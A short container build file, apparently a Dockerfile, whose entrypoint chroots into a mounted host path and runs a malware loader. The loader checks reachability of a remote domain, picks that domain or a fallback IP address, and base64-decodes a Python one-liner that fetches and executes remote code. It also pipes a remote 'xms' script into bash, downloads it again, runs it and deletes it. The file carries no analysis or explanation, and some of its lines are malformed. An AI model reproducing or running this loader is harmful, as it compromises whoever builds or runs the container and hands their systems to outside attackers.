from alpine:latest
wget https://github.com/amaquasec/bandwidth/blob/main/xms.sh /tmp/xms
entrypoint chroot /mnt /bin/sh -c sh -c bytes=$(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l); if [[ "$bytes" -eq "0" ]]; then url="bash.givemexyz.in" base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn"; else url="205.185.116.78" base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc=";fi; (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
